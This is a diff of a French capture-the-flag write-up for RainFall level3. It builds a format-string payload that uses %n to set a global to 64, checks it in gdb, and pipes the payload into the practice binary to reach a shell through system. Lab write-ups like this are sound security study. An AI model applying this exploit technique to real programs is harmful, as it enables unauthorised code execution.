@@ -64,7 +64,8 @@ test.c:7:19: warning: format not a string literal and no format arguments [-Wfor
       |
 ```
 On va a priori pouvoir faire un exploit de format.
-Un contrôle protège l'appel a **system**, un cmp est fait entre une valeur à l'adresse **0x804988c** et 0x40, soit 64. Si on le passe, **fwrite** est appelé, on suppose que fwrite va écrire dans un buffer ou sur la sortie standard et que system va prendre cette sortie comme argument:
+Un contrôle protège l'appel a **system**, un cmp est fait entre une valeur à l'adresse **ds:0x804988c** et 0x40, soit 64. **ds** veut dire qu'elle est dans le data segment, c'est donc une variable static ou global modifiable.
+Si on le passe, **fwrite** est appelé, on suppose que fwrite va écrire dans un buffer ou sur la sortie standard et que system va prendre cette sortie comme argument:
 ```asm
  80484da:       a1 8c 98 04 08          mov    eax,ds:0x804988c
  80484df:       83 f8 40                cmp    eax,0x40
@@ -112,6 +113,60 @@ soit:
 1 octet imprimé + 60 octets imprimés + 3 octets imprimés:
 ```
 level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%4$n"' > /tmp/payload
+```
+Testons avec **gdb**:
+```
+level3@RainFall:~$ gdb -q ./level3
+Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x804851d
+(gdb) b v
+Breakpoint 2 at 0x80484ad
+(gdb) b *0x080484df
+Breakpoint 3 at 0x80484df
+(gdb) r < /tmp/payload
+Starting program: /home/user/level3/level3 < /tmp/payload
+
+Breakpoint 1, 0x0804851d in main ()
+(gdb) s
+Single stepping until exit from function main,
+which has no line number information.
+
+Breakpoint 2, 0x080484ad in v ()
+(gdb)
+Single stepping until exit from function v,
+which has no line number information.
+�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Breakpoint 3, 0x080484df in v ()
+(gdb) i r
+eax            0x40     64
+ecx            0x0      0
+edx            0x0      0
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff510       0xbffff510
+ebp            0xbffff728       0xbffff728
+esi            0x0      0
+edi            0x0      0
+eip            0x80484df        0x80484df <v+59>
+eflags         0x210282 [ SF IF RF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb)
+(gdb) s
+Single stepping until exit from function v,
+which has no line number information.
+Wait what?!
+0x08048525 in main ()
+(gdb) quit
+```
+on a bien 64 dans **eax** donc le compte est bon
+Exploit:
+```
 level3@RainFall:~$ cat /tmp/payload - | ./level3
 �aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Wait what?!
